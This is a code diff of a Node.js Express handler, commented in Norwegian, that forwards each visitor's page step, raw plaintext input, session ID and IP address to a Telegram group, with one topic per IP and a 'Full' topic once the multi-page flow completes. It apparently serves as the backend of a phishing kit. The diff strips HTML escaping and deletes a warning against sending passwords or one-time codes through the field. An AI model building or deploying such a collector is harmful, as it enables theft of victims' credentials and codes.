@@ -1,109 +1,237 @@
 // api/log_data.js — Express handler (CommonJS)
-
 const crypto = require('crypto');
 
+// Telegram Bot API konfigurasjon
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Supergruppe ID (må være en supergruppe for topics)
 
-// -----------------------------------------------------------------------------
-// In-memory cache
-// -----------------------------------------------------------------------------
-
+// Cache for å lagre mapping mellom IP-adresse og topic/message_thread_id
+// I produksjon kan du bruke en database i stedet
 const ipToTopicMap = new Map();
+const ipToFullTopicMap = new Map();
+const ipLogHistory = new Map();
+const ipFullTopicSynced = new Set();
 
-// Holder midlertidig data for sider som skal kombineres.
-const pendingGroups = new Map();
+function getFullTopicName(ipAddress) {
+  return `Full: ${ipAddress}`;
+}
 
-// Når side 4 er behandlet, vet vi at topicet skal hete "Full: IP".
-const fullTopicIPs = new Set();
-
-// -----------------------------------------------------------------------------
-// Page configuration
-// -----------------------------------------------------------------------------
-
-const GROUP_1_PAGES = new Set([
-  'page1.5.html',
-  'page1.7.html',
-  'page2.html',
-  'page3.html',
-]);
-
-const GROUP_2_PAGES = new Set([
-  'page3.5.html',
-  'page4.html',
-]);
-
-const SEPARATE_PAGES = new Set([
-  'page5.html',
-  'page6.html',
-  'page7.html',
-]);
-
-// -----------------------------------------------------------------------------
-// Helpers
-// -----------------------------------------------------------------------------
-
-function escapeHtml(value) {
-  if (value === undefined || value === null) {
-    return '';
+function appendLogHistory(ipAddress, entry) {
+  if (!ipLogHistory.has(ipAddress)) {
+    ipLogHistory.set(ipAddress, []);
   }
-
-  return String(value)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
+  ipLogHistory.get(ipAddress).push(entry);
 }
 
-function getIpAddress(req) {
-  const forwardedFor = req.headers['x-forwarded-for'];
-
-  if (forwardedFor) {
-    return forwardedFor.split(',')[0].trim();
-  }
-
-  return (
-    req.headers['x-real-ip'] ||
-    req.socket?.remoteAddress ||
-    'Ukjent IP'
-  );
+function getLogHistory(ipAddress) {
+  return ipLogHistory.get(ipAddress) || [];
 }
 
-function getPageOrder(page) {
-  const order = {
-    'page1.5.html': 1,
-    'page1.7.html': 2,
-    'page2.html': 3,
-    'page3.html': 4,
-    'page3.5.html': 5,
-    'page4.html': 6,
-    'page5.html': 7,
-    'page6.html': 8,
-    'page7.html': 9,
-  };
+const PAGE_FLOW_ORDER = {
+  'page1.5.html': 1,
+  'page1.7.html': 2,
+  'page2.html': 3,
+  'page3.html': 4,
+  'page3.5.html': 5,
+  'page4.html': 6,
+  'page5.html': 7,
+  'page6.html': 8,
+  'page7.html': 9,
+};
 
-  return order[page] ?? 999;
+function getPageFlowOrder(page) {
+  return PAGE_FLOW_ORDER[page] ?? 999;
 }
 
-function formatTime(timestamp) {
-  return new Date(timestamp).toLocaleString('nb-NO', {
-    timeZone: 'Europe/Oslo',
+function getOrderedLogHistory(ipAddress) {
+  return [...getLogHistory(ipAddress)].sort((a, b) => {
+    const pageOrder = getPageFlowOrder(a.page) - getPageFlowOrder(b.page);
+    if (pageOrder !== 0) {
+      return pageOrder;
+    }
+
+    return new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime();
   });
 }
 
-// -----------------------------------------------------------------------------
-// Telegram API
-// -----------------------------------------------------------------------------
+/**
+ * Sjekker om et topic med gitt navn allerede eksisterer i supergruppen
+ */
+async function findExistingTopicByName(topicName) {
+  try {
+    let offset = 0;
+    const limit = 100;
+    let hasMore = true;
 
-async function telegramRequest(method, payload) {
-  if (!TELEGRAM_BOT_TOKEN) {
-    throw new Error('TELEGRAM_BOT_TOKEN mangler');
+    while (hasMore) {
+      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;
+
+      const response = await fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          offset: offset,
+          limit: limit,
+        }),
+      });
+
+      if (!response.ok) {
+        const errorData = await response.json().catch(() => ({}));
+        console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
+        return null;
+      }
+
+      const result = await response.json();
+
+      if (result.ok && result.result && result.result.topics) {
+        const existingTopic = result.result.topics.find(
+          topic => topic.name === topicName
+        );
+
+        if (existingTopic) {
+          console.log(`Fant eksisterende topic "${topicName}": ${existingTopic.message_thread_id}`);
+          return existingTopic.message_thread_id;
+        }
+
+        if (result.result.topics.length < limit) {
+          hasMore = false;
+        } else {
+          offset += limit;
+        }
+      } else {
+        hasMore = false;
+      }
+    }
+
+    return null;
+  } catch (error) {
+    console.error(`Feil ved søk etter topic "${topicName}":`, error);
+    return null;
+  }
+}
+
+async function findExistingTopicForIP(ipAddress) {
+  return findExistingTopicByName(`IP: ${ipAddress}`);
+}
+
+/**
+ * Oppretter et nytt forum-topic i supergruppen
+ */
+async function createForumTopic(topicName, iconColor = 0x6FB9F0) {
+  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;
+
+  const response = await fetch(telegramApiUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      name: topicName,
+      icon_color: iconColor,
+    }),
+  });
+
+  if (!response.ok) {
+    const errorData = await response.json();
+
+    if (errorData.description && errorData.description.includes('already exists')) {
+      console.log(`Topic "${topicName}" eksisterer allerede, søker etter det...`);
+      const existingTopicId = await findExistingTopicByName(topicName);
+      if (existingTopicId) {
+        return existingTopicId;
+      }
+    }
+
+    if (errorData.error_code === 400) {
+      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
+    }
+    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
   }
 
-  const url =
-    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+  const result = await response.json();
+  console.log(`Opprettet nytt topic "${topicName}": ${result.result.message_thread_id}`);
+  return result.result.message_thread_id;
+}
 
-  const response = await fetch(url, {
+async function getOrCreateTopicByName(topicName, iconColor = 0x6FB9F0) {
+  const existingTopicId = await findExistingTopicByName(topicName);
+  if (existingTopicId) {
+    return existingTopicId;
+  }
+
+  try {
+    return await createForumTopic(topicName, iconColor);
+  } catch (error) {
+    console.error(`Kunne ikke opprette topic "${topicName}":`, error);
+
+    if (error.message && error.message.includes('already exists')) {
+      return await findExistingTopicByName(topicName);
+    }
+
+    return null;
+  }
+}
+
+/**
+ * Oppretter eller henter topic ID for en IP-adresse
+ * Hvis det er en ny IP, oppretter vi et nytt topic i supergruppen
+ */
+async function getOrCreateTopicForIP(ipAddress) {
+  if (ipToTopicMap.has(ipAddress)) {
+    return ipToTopicMap.get(ipAddress);
+  }
+
+  const topicId = await getOrCreateTopicByName(`IP: ${ipAddress}`, 0x6FB9F0);
+  if (topicId) {
+    ipToTopicMap.set(ipAddress, topicId);
+  }
+  return topicId;
+}
+
+/**
+ * Oppretter eller henter "Full"-topic når brukeren har fullført flyten
+ */
+async function getOrCreateFullTopicForIP(ipAddress) {
+  if (ipToFullTopicMap.has(ipAddress)) {
+    return ipToFullTopicMap.get(ipAddress);
+  }
+
+  const topicId = await getOrCreateTopicByName(getFullTopicName(ipAddress), 0x8EEE98);
+  if (topicId) {
+    ipToFullTopicMap.set(ipAddress, topicId);
+  }
+  return topicId;
+}
+
+/**
+ * Oppretter et nytt topic i supergruppen for en IP-adresse
+ */
+async function createTopicForIP(ipAddress) {
+  return createForumTopic(`IP: ${ipAddress}`, 0x6FB9F0);
+}
+
+/**
+ * Sender en melding til Telegram (i et topic hvis topicId er gitt)
+ */
+async function sendToTelegram(chatId, message, topicId = null) {
+  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  
+  const payload = {
+    chat_id: chatId,
+    text: message,
+    parse_mode: 'HTML', // Bruker HTML for formatering
+  };
+
+  // Hvis topicId er gitt, legg til message_thread_id for å sende til riktig topic
+  if (topicId !== null) {
+    payload.message_thread_id = topicId;
+  }
+  
+  const response = await fetch(telegramApiUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -111,454 +239,198 @@ async function telegramRequest(method, payload) {
     body: JSON.stringify(payload),
   });
 
-  const result = await response.json().catch(() => null);
-
-  if (!response.ok || !result?.ok) {
-    const description =
-      result?.description || response.statusText || 'Ukjent Telegram-feil';
-
-    const error = new Error(
-      `Telegram API error: ${description}`
-    );
-
-    error.telegram = true;
-    error.status = response.status;
-    error.error_code = result?.error_code;
-    error.description = description;
-
-    throw error;
+  if (!response.ok) {
+    const errorData = await response.json();
+    throw new Error(`Telegram API error: ${errorData.description || response.statusText}`);
   }
 
-  return result;
+  return await response.json();
 }
 
-// -----------------------------------------------------------------------------
-// Create topic
-// -----------------------------------------------------------------------------
-
-async function createForumTopic(topicName) {
-  const result = await telegramRequest('createForumTopic', {
-    chat_id: TELEGRAM_CHAT_ID,
-    name: topicName,
-    icon_color: 0x6FB9F0,
-  });
-
-  return result.result.message_thread_id;
-}
-
-// -----------------------------------------------------------------------------
-// Get/create topic
-//
-// IMPORTANT:
-// We no longer use getForumTopics.
-// That method is not available through the Telegram Bot API.
-// -----------------------------------------------------------------------------
-
-async function getOrCreateTopicForIP(ipAddress) {
-  if (ipToTopicMap.has(ipAddress)) {
-    return ipToTopicMap.get(ipAddress);
+/**
+ * Formaterer data til en lesbar Telegram-melding
+ */
+function formatTelegramMessage(data, isNewIPAddress = false) {
+  const { page, event_description, klartekst_input, ip_adresse, session_uid, timestamp } = data;
+  
+  let message = '';
+  
+  // Hvis dette er en ny IP-adresse, legg til en velkomstmelding
+  if (isNewIPAddress) {
+    message += `🆕 <b>Ny bruker opprettet</b>\n`;
+    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+  
+  // Standard aktivitetsmelding
+  message += `🔔 <b>Aktivitet</b>\n`;
+  message += `📄 <b>Side:</b> ${page || 'Ukjent'}\n`;
+  message += `📝 <b>Hendelse:</b> ${event_description || 'Ingen beskrivelse'}\n`;
+  
+  if (klartekst_input) {
+    message += `✏️ <b>Input:</b> <code>${klartekst_input}</code>\n`;
+  }
+  
+  if (session_uid) {
+    message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
   }
 
-  const topicName = fullTopicIPs.has(ipAddress)
-    ? `Full: ${ipAddress}`
-    : `IP: ${ipAddress}`;
-
-  try {
-    const topicId = await createForumTopic(topicName);
-
-    ipToTopicMap.set(ipAddress, topicId);
-
-    return topicId;
-  } catch (error) {
-    console.error(
-      `Kunne ikke opprette topic "${topicName}":`,
-      error.message
-    );
-
-    throw error;
-  }
+  const formattedTime = timestamp
+    ? new Date(timestamp).toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })
+    : new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' });
+  
+  message += `\n⏰ <b>Tid:</b> ${formattedTime}`;
+  
+  return message;
 }
 
-// -----------------------------------------------------------------------------
-// Rename existing topic
-// -----------------------------------------------------------------------------
-
-async function renameForumTopic(topicId, newName) {
-  await telegramRequest('editForumTopic', {
-    chat_id: TELEGRAM_CHAT_ID,
-    message_thread_id: topicId,
-    name: newName,
-  });
-
-  console.log(
-    `Topic ${topicId} endret til "${newName}"`
-  );
-}
-
-// -----------------------------------------------------------------------------
-// Send message
-// -----------------------------------------------------------------------------
-
-async function sendToTelegram(message, topicId) {
-  const payload = {
-    chat_id: TELEGRAM_CHAT_ID,
-    text: message,
-    parse_mode: 'HTML',
-  };
-
-  if (topicId !== null && topicId !== undefined) {
-    payload.message_thread_id = topicId;
-  }
-
-  return telegramRequest('sendMessage', payload);
-}
-
-// -----------------------------------------------------------------------------
-// Format one activity
-// -----------------------------------------------------------------------------
-
-function formatActivity(data) {
-  const {
-    page,
-    event_description,
-    klartekst_input,
-    session_uid,
-    timestamp,
-  } = data;
+function formatCompletionMessage(data, isNewFullTopic = false) {
+  const { page, event_description, klartekst_input, ip_adresse, session_uid } = data;
 
   let message = '';
 
-  message += `📄 <b>Side:</b> ${escapeHtml(page || 'Ukjent')}\n`;
+  if (isNewFullTopic) {
+    message += `✅ <b>Fullført flyt</b>\n`;
+    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+  } else {
+    message += `✅ <b>Flyt fullført (oppdatering)</b>\n\n`;
+  }
 
-  message +=
-    `📝 <b>Hendelse:</b> ` +
-    `${escapeHtml(event_description || 'Ingen beskrivelse')}\n`;
+  message += `📄 <b>Siste side:</b> ${page || 'Ukjent'}\n`;
+  message += `📝 <b>Hendelse:</b> ${event_description || 'Ingen beskrivelse'}\n`;
 
-  // Behold feltet som generelt input.
-  // Ikke bruk dette til passord, OTP eller andre hemmeligheter.
-  if (
-    klartekst_input !== undefined &&
-    klartekst_input !== null &&
-    String(klartekst_input).trim() !== ''
-  ) {
-    message +=
-      `✏️ <b>Input:</b> ` +
-      `<code>${escapeHtml(klartekst_input)}</code>\n`;
+  if (klartekst_input) {
+    message += `✏️ <b>Input:</b> <code>${klartekst_input}</code>\n`;
   }
 
   if (session_uid) {
-    message +=
-      `🆔 <b>Session ID:</b> ` +
-      `<code>${escapeHtml(session_uid)}</code>\n`;
+    message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
   }
 
-  message +=
-    `⏰ <b>Tid:</b> ` +
-    `${escapeHtml(formatTime(timestamp))}`;
+  message += `\n⏰ <b>Tid:</b> ${new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })}`;
 
   return message;
 }
 
-// -----------------------------------------------------------------------------
-// Format grouped message
-// -----------------------------------------------------------------------------
+async function syncFullTopicHistory(ipAddress, fullTopicId, currentData) {
+  const completionMessage = formatCompletionMessage(currentData, true);
+  const history = getOrderedLogHistory(ipAddress);
 
-function formatGroupedMessage(ipAddress, entries, title) {
-  const sorted = [...entries].sort((a, b) => {
-    const order =
-      getPageOrder(a.page) -
-      getPageOrder(b.page);
+  for (const entry of history) {
+    const historyMessage = formatTelegramMessage({
+      page: entry.page,
+      event_description: entry.event_description,
+      klartekst_input: entry.klartekst_input,
+      ip_adresse: ipAddress,
+      session_uid: entry.session_uid,
+      timestamp: entry.timestamp,
+    }, false);
 
-    if (order !== 0) {
-      return order;
-    }
-
-    return (
-      new Date(a.timestamp).getTime() -
-      new Date(b.timestamp).getTime()
-    );
-  });
-
-  let message = '';
-
-  message += `${title}\n`;
-  message += `📍 <b>IP:</b> <code>${escapeHtml(ipAddress)}</code>\n`;
-  message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-
-  for (let i = 0; i < sorted.length; i++) {
-    message += formatActivity(sorted[i]);
-
-    if (i < sorted.length - 1) {
-      message += '\n\n━━━━━━━━━━━━━━━━━━━━\n\n';
-    }
+    await sendToTelegram(TELEGRAM_CHAT_ID, historyMessage, fullTopicId);
   }
 
-  return message;
+  await sendToTelegram(TELEGRAM_CHAT_ID, completionMessage, fullTopicId);
+
+  ipFullTopicSynced.add(ipAddress);
+  console.log(`Historikk (${history.length} logger) sendt i flytrekkefølge til topic "${getFullTopicName(ipAddress)}"`);
 }
-
-// -----------------------------------------------------------------------------
-// Group storage
-// -----------------------------------------------------------------------------
-
-function getPendingGroup(ipAddress, groupName) {
-  if (!pendingGroups.has(ipAddress)) {
-    pendingGroups.set(ipAddress, {
-      group1: [],
-      group2: [],
-    });
-  }
-
-  return pendingGroups.get(ipAddress)[groupName];
-}
-
-function addToPendingGroup(ipAddress, groupName, entry) {
-  const group = getPendingGroup(ipAddress, groupName);
-
-  group.push(entry);
-}
-
-// -----------------------------------------------------------------------------
-// Send Group 1
-//
-// page1.5 + page1.7 + page2 + page3
-//
-// The message is sent when page3 arrives.
-// -----------------------------------------------------------------------------
-
-async function handleGroup1(ipAddress, topicId, entry) {
-  addToPendingGroup(ipAddress, 'group1', entry);
-
-  if (entry.page !== 'page3.html') {
-    return;
-  }
-
-  const groups = pendingGroups.get(ipAddress);
-
-  if (!groups || groups.group1.length === 0) {
-    return;
-  }
-
-  const message = formatGroupedMessage(
-    ipAddress,
-    groups.group1,
-    '📦 <b>Aktivitet 1–3</b>'
-  );
-
-  await sendToTelegram(message, topicId);
-
-  groups.group1 = [];
-
-  console.log(
-    `Gruppe 1 sendt for IP ${ipAddress}`
-  );
-}
-
-// -----------------------------------------------------------------------------
-// Send Group 2
-//
-// page3.5 + page4
-//
-// The message is sent when page4 arrives.
-// -----------------------------------------------------------------------------
-
-async function handleGroup2(ipAddress, topicId, entry) {
-  addToPendingGroup(ipAddress, 'group2', entry);
-
-  if (entry.page !== 'page4.html') {
-    return;
-  }
-
-  const groups = pendingGroups.get(ipAddress);
-
-  if (!groups || groups.group2.length === 0) {
-    return;
-  }
-
-  const message = formatGroupedMessage(
-    ipAddress,
-    groups.group2,
-    '📦 <b>Aktivitet 3.5–4</b>'
-  );
-
-  await sendToTelegram(message, topicId);
-
-  groups.group2 = [];
-
-  console.log(
-    `Gruppe 2 sendt for IP ${ipAddress}`
-  );
-
-  // ---------------------------------------------------------------------------
-  // AFTER page4:
-  // Rename the SAME topic.
-  // We do NOT create another topic.
-  // ---------------------------------------------------------------------------
-
-  if (!fullTopicIPs.has(ipAddress)) {
-    await renameForumTopic(
-      topicId,
-      `Full: ${ipAddress}`
-    );
-
-    fullTopicIPs.add(ipAddress);
-  }
-}
-
-// -----------------------------------------------------------------------------
-// Send separate page
-//
-// page5 / page6 / page7
-// -----------------------------------------------------------------------------
-
-async function handleSeparatePage(
-  ipAddress,
-  topicId,
-  entry
-) {
-  const message =
-    `🔔 <b>Aktivitet</b>\n` +
-    `📍 <b>IP:</b> <code>${escapeHtml(ipAddress)}</code>\n` +
-    `━━━━━━━━━━━━━━━━━━━━\n\n` +
-    formatActivity(entry);
-
-  await sendToTelegram(message, topicId);
-
-  console.log(
-    `Separat melding sendt for ${entry.page} / ${ipAddress}`
-  );
-}
-
-// -----------------------------------------------------------------------------
-// Main handler
-// -----------------------------------------------------------------------------
 
 async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).json({
-      message: 'Kun POST er tillatt',
-    });
+    return res.status(405).json({ message: 'Kun POST er tillatt' });
   }
 
   try {
-    if (!TELEGRAM_BOT_TOKEN) {
-      return res.status(500).json({
-        message: 'TELEGRAM_BOT_TOKEN mangler',
-      });
+    // Valider at Telegram-konfigurasjonen er satt
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      throw new Error('TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler');
     }
 
-    if (!TELEGRAM_CHAT_ID) {
-      return res.status(500).json({
-        message: 'TELEGRAM_CHAT_ID mangler',
-      });
+    const { page, event_description, klartekst_input, session_uid: client_session_uid, flow_completed } = req.body;
+    
+    // Hent IP-adresse fra headers (Vercel setter x-forwarded-for)
+    const forwardedFor = req.headers['x-forwarded-for'];
+    const ip_adresse = forwardedFor 
+      ? forwardedFor.split(',')[0].trim() // Tar første IP hvis det er flere
+      : req.headers['x-real-ip'] || req.socket.remoteAddress || 'Ukjent IP';
+
+    let session_uid = client_session_uid;
+
+    // Hvis klientsiden ikke sendte en UID, generer en ny
+    if (!session_uid) {
+      session_uid = crypto.randomUUID();
+      console.log('Genererte ny session_uid på serveren:', session_uid);
+    } else {
+      console.log('Mottok session_uid fra klienten:', session_uid);
     }
 
-    const body = req.body || {};
+    // Sjekk om dette er en ny IP-adresse før vi oppretter topic
+    const isNewIPAddress = !ipToTopicMap.has(ip_adresse);
 
-    const {
-      page,
-      event_description,
-      klartekst_input,
-      session_uid: clientSessionUid,
-    } = body;
-
-    const ip_adresse = getIpAddress(req);
-
-    const session_uid =
-      clientSessionUid || crypto.randomUUID();
-
-    const timestamp =
-      new Date().toISOString();
-
-    const entry = {
+    const logEntry = {
       page,
       event_description,
       klartekst_input,
       session_uid,
-      timestamp,
+      timestamp: new Date().toISOString(),
     };
+    appendLogHistory(ip_adresse, logEntry);
+    
+    // Hent eller opprett topic for denne IP-adressen
+    const topicId = await getOrCreateTopicForIP(ip_adresse);
 
-    console.log(
-      `Log mottatt: ${ip_adresse} / ${page}`
-    );
-
-    // -------------------------------------------------------------------------
-    // Get the ONE topic for this IP.
-    // -------------------------------------------------------------------------
-
-    const topicId =
-      await getOrCreateTopicForIP(ip_adresse);
-
-    // -------------------------------------------------------------------------
-    // GROUP 1
-    // -------------------------------------------------------------------------
-
-    if (GROUP_1_PAGES.has(page)) {
-      await handleGroup1(
-        ip_adresse,
-        topicId,
-        entry
-      );
-    }
-
-    // -------------------------------------------------------------------------
-    // GROUP 2
-    // -------------------------------------------------------------------------
-
-    else if (GROUP_2_PAGES.has(page)) {
-      await handleGroup2(
-        ip_adresse,
-        topicId,
-        entry
-      );
-    }
-
-    // -------------------------------------------------------------------------
-    // SEPARATE PAGES
-    // -------------------------------------------------------------------------
-
-    else if (SEPARATE_PAGES.has(page)) {
-      await handleSeparatePage(
-        ip_adresse,
-        topicId,
-        entry
-      );
-    }
-
-    // -------------------------------------------------------------------------
-    // Unknown page
-    // -------------------------------------------------------------------------
-
-    else {
-      const message =
-        `🔔 <b>Aktivitet</b>\n` +
-        `📍 <b>IP:</b> <code>${escapeHtml(ip_adresse)}</code>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        formatActivity(entry);
-
-      await sendToTelegram(
-        message,
-        topicId
-      );
-    }
-
-    return res.status(200).json({
-      message: 'Data behandlet',
-      session_uid,
-      ip_adresse,
+    // Formater meldingen (inkluderer spesiell header hvis ny IP)
+    const message = formatTelegramMessage({
       page,
-    });
+      event_description,
+      klartekst_input,
+      ip_adresse,
+      session_uid,
+      timestamp: logEntry.timestamp,
+    }, isNewIPAddress);
 
+    // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
+    await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);
+
+    // Ekstra "Full"-topic når brukeren har fullført flyten (page4/page6)
+    if (flow_completed) {
+      const fullTopicId = await getOrCreateFullTopicForIP(ip_adresse);
+
+      if (fullTopicId) {
+        const currentData = {
+          page,
+          event_description,
+          klartekst_input,
+          ip_adresse,
+          session_uid,
+        };
+
+        if (!ipFullTopicSynced.has(ip_adresse)) {
+          await syncFullTopicHistory(ip_adresse, fullTopicId, currentData);
+        } else {
+          await sendToTelegram(TELEGRAM_CHAT_ID, message, fullTopicId);
+        }
+
+        console.log(`Full-topic oppdatert for IP: ${ip_adresse}`);
+      }
+    } else if (ipFullTopicSynced.has(ip_adresse)) {
+      const fullTopicId = ipToFullTopicMap.get(ip_adresse);
+      if (fullTopicId) {
+        await sendToTelegram(TELEGRAM_CHAT_ID, message, fullTopicId);
+      }
+    }
+
+    console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);
+
+    res.status(200).json({ 
+      message: 'Data sendt til Telegram!', 
+      session_uid: session_uid,
+      ip_adresse: ip_adresse 
+    });
   } catch (error) {
-    console.error(
-      'Telegram error:',
-      error
-    );
-
-    return res.status(500).json({
-      message:
-        error.message ||
-        'Serverfeil',
-    });
+    console.error('Telegram error:', error);
+    res.status(500).json({ message: `Serverfeil: ${error.message}` });
   }
 }
 
